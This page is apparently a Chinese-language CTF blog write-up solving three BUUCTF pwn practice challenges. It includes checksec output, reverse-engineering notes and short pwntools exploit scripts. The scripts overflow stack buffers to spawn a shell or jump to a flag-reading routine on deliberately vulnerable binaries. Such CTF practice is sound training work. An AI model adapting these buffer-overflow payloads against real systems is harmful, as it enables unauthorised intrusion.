@@ -1,0 +1,660 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#33cc66">
+  <meta name="author" content="夏白">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="BUUCTF刷题jarvisoj_level2经典拿到题先check一下，32位，只开了nx保护: 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  shift+f12查看字符串信息，直接看到了s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="寒假pwn题第三天">
+<meta property="og:url" content="http://example.com/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/index.html">
+<meta property="og:site_name" content="夏白の博客">
+<meta property="og:description" content="BUUCTF刷题jarvisoj_level2经典拿到题先check一下，32位，只开了nx保护: 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  shift+f12查看字符串信息，直接看到了s">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces/hexo/source_posts/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/image-20230205180438095.png">
+<meta property="og:image" content="http://example.com/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces/hexo/source_posts/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/image-20230205180900543.png">
+<meta property="og:image" content="http://example.com/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces/hexo/source_posts/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/image-20230205181702275.png">
+<meta property="og:image" content="http://example.com/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces/hexo/source_posts/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/image-20230205181725468.png">
+<meta property="og:image" content="http://example.com/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces/hexo/source_posts/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/image-20230205182537277.png">
+<meta property="og:image" content="http://example.com/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces/hexo/source_posts/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/image-20230205182159480.png">
+<meta property="og:image" content="http://example.com/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces/hexo/source_posts/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/image-20230205182841310.png">
+<meta property="og:image" content="http://example.com/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces/hexo/source_posts/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/image-20230205182906447.png">
+<meta property="og:image" content="http://example.com/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces/hexo/source_posts/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/image-20230205183455880.png">
+<meta property="og:image" content="http://example.com/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces/hexo/source_posts/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/image-20230205183811164.png">
+<meta property="article:published_time" content="2023-02-05T09:57:51.000Z">
+<meta property="article:modified_time" content="2023-02-05T10:39:48.101Z">
+<meta property="article:author" content="夏白">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces/hexo/source_posts/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/image-20230205180438095.png">
+  
+  
+  
+  <title>寒假pwn题第三天 - 夏白の博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>夏白の博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="寒假pwn题第三天"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-02-05 17:57" pubdate>
+          2023年2月5日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">寒假pwn题第三天</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="BUUCTF刷题"><a href="#BUUCTF刷题" class="headerlink" title="BUUCTF刷题"></a>BUUCTF刷题</h1><h3 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h3><p>经典拿到题先check一下，32位，只开了nx保护:</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure>
+
+<p>shift+f12查看字符串信息，直接看到了system和&#x2F;bin&#x2F;sh</p>
+<p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205180438095.png" srcset="/img/loading.gif" lazyload alt="image-20230205180438095"></p>
+<p>那一下就很清晰了，直接利用这些去构造system(&#x2F;bin&#x2F;sh)，只需要找到一个输入点就可以了，先看一下main函数，里面有一个vulnerable_fuction，跟进后发现了输入点。</p>
+<p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205180900543.png" srcset="/img/loading.gif" lazyload alt="image-20230205180900543"></p>
+<p>直接写exp:</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25870</span>)  <br>elf = ELF(<span class="hljs-string">&#x27;./jarvisoj_level2&#x27;</span>)  <br><br>system_addr = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-number">0x0804a024</span><br>main_addr = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = b<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">136</span>+<span class="hljs-number">4</span>) + p32(system_addr)+p32(main_addr)+p32(binsh_addr)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h3><p>64位程序，只开了nx保护:</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure>
+
+<p>shift+f12查看字符串，发现&#x2F;bin&#x2F;sh</p>
+<p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205181702275.png" srcset="/img/loading.gif" lazyload alt="image-20230205181702275"></p>
+<p>跟进之后找到后门函数:</p>
+<p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205181725468.png" srcset="/img/loading.gif" lazyload alt="image-20230205181725468"></p>
+<p>也就是这个backdoor了:</p>
+<p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205182537277.png" srcset="/img/loading.gif" lazyload alt="image-20230205182537277"></p>
+<p>查看main函数，发现有俩输入,这两个nbyes我自己也没太搞懂，就刷了刷别人的wp，但是别人写的仍然感觉云里雾里，搞了半天才明白，原来第二次输入的那个buf的数据长度由我们第一次输入的nbytes来控制。</p>
+<p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205182159480.png" srcset="/img/loading.gif" lazyload alt="image-20230205182159480"></p>
+<p>附上exp:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><br><span class="hljs-attribute">p</span>=remote(&#x27;node4.buuoj.cn&#x27;,28787)<br><span class="hljs-attribute">shell_addr</span>=0x4006e6<br><br>p.sendline(<span class="hljs-string">&#x27;100&#x27;</span>)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0x10+8)+p64(shell_addr)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p>例行检查，32位，只开了nx保护(你们这三道题还真是出奇的一致呢&#x3D; &#x3D;):</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure>
+
+<p>shift+f12查看字符串，直接看到了flag.txt。哇，是幸福的味道:</p>
+<p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205182841310.png" srcset="/img/loading.gif" lazyload alt="image-20230205182841310"></p>
+<p>跟进过后，发现这个函数的意思大概就是让a1&#x3D;0x308cd64f，a2&#x3D;0x195719d1<img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205182906447.png" srcset="/img/loading.gif" lazyload alt="image-20230205182906447"></p>
+<p>本以为是一道平平无奇的题目，结果看了一下a1,a2的位置，居然在00000000的后面，没法利用溢出控制，直接懵逼。又去看了别人的wp，发现好多人都在用什么mprotect函数跳过bss，额，可是我太菜了搞不太懂QAQ。又是一番搜寻，终于找到了一个弄的懂的wp。</p>
+<p>这边我们要想办法绕过这个if判断，tap+空格来到这个界面，看到从0x80489bb开始，程序开始设置打开flag.txt的参数，我们只要将程序执行流跳转到这里就可以读出flag:</p>
+<p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205183455880.png" srcset="/img/loading.gif" lazyload alt="image-20230205183455880"></p>
+<p>不得不服网上大佬的强大。找到函数中的输入点，溢出覆盖返回地址。</p>
+<p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205183811164.png" srcset="/img/loading.gif" lazyload alt="image-20230205183811164"></p>
+<p>exp如下:</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span>*<br><br><span class="hljs-variable">p</span>=<span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="hljs-variable">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span><span class="hljs-variable">x38</span>+<span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-number">0</span><span class="hljs-variable">x80489bb</span>)</span><br><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload</span>)<br><br><span class="hljs-variable">p.interactive</span>()<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>寒假pwn题第三天</div>
+      <div>http://example.com/2023/02/05/寒假pwn题第三天/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>夏白</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年2月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/" title="寒假pwn题第二天">
+                        <span class="hidden-mobile">寒假pwn题第二天</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Study hard</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Day day up！</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
